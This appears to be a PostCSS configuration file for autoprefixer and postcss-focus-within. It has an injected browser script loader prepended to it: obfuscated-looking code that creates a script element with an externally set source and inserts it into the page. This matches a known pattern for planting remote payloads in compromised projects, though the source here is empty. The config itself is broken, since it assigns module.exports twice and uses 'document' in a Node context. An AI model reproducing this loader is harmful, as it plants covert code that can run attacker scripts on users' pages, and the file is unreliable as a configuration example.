var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}var postcssFocusWithin = require('postcss-focus-within');

module.exports = {
    plugins: {
        autoprefixer: {}
    }
};

module.exports = {
    plugins: [
        postcssFocusWithin(/* pluginOptions */)
    ]
};
